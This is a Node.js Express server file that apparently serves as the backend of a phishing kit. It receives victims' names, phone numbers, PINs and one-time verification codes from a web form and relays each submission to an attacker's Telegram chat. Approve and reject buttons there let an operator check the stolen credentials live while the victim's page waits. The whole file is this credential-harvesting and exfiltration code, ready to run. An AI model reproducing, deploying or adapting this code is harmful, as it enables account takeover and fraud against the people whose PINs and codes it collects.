require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;

// Store approval states per requestId
const approvedPins = {};
const approvedCodes = {};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ---------------- TELEGRAM HELPERS ----------------
async function sendTelegramMessage(text, inlineKeyboard) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            { chat_id: TELEGRAM_CHAT_ID, text, reply_markup: { inline_keyboard: inlineKeyboard } }
        );
        console.log('✅ Telegram message sent');
    } catch (err) {
        console.error('❌ Telegram error:', err.message);
    }
}

async function answerCallback(callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
        console.log('✅ Answered callback:', callbackId);
    } catch (err) {
        console.error('❌ Callback error:', err.message);
    }
}

// ---------------- ROUTES ----------------

// PIN submit
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin } = req.body;
    const requestId = uuidv4();

    console.log('📩 PIN received:', { name, phone, pin, requestId });
    approvedPins[requestId] = null;

    sendTelegramMessage(
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]]
    ).catch(err => console.error(err));

    // Always respond with requestId
    res.json({ status: 'pending', requestId });
});

// PIN check
app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    console.log(`Checking PIN approval for requestId: ${requestId}`, approvedPins[requestId]);
    res.json({ approved: approvedPins[requestId] ?? null });
});

// CODE submit
app.post('/submit-code', (req, res) => {
    const { name, phone, code } = req.body;
    const requestId = uuidv4();

    console.log('📩 CODE received:', { name, phone, code, requestId });
    approvedCodes[requestId] = null;

    sendTelegramMessage(
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
        ]]
    ).catch(err => console.error(err));

    res.json({ status: 'pending', requestId });
});

// CODE check
app.get('/check-code/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    console.log(`Checking CODE approval for requestId: ${requestId}`, approvedCodes[requestId]);
    res.json({ approved: approvedCodes[requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook', async (req, res) => {
    console.log('🔔 Telegram webhook hit!');
    console.log('Payload:', JSON.stringify(req.body, null, 2));

    const cb = req.body.callback_query;
    if (!cb) {
        console.log('⚠️ No callback_query in request');
        return res.sendStatus(200);
    }

    const [action, requestId] = cb.data.split(':');
    console.log('Callback action:', action, 'Request ID:', requestId);

    // Update approval states
    if (action === 'pin_ok') approvedPins[requestId] = true;
    if (action === 'pin_bad') approvedPins[requestId] = false;
    if (action === 'code_ok') approvedCodes[requestId] = true;
    if (action === 'code_bad') approvedCodes[requestId] = false;

    await answerCallback(cb.id);
    console.log('✅ Callback processed', { approvedPins, approvedCodes });

    res.sendStatus(200);
});

// ---------------- TEST ROUTE ----------------
app.get('/', (req, res) => res.send('Server is running 🚀'));

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
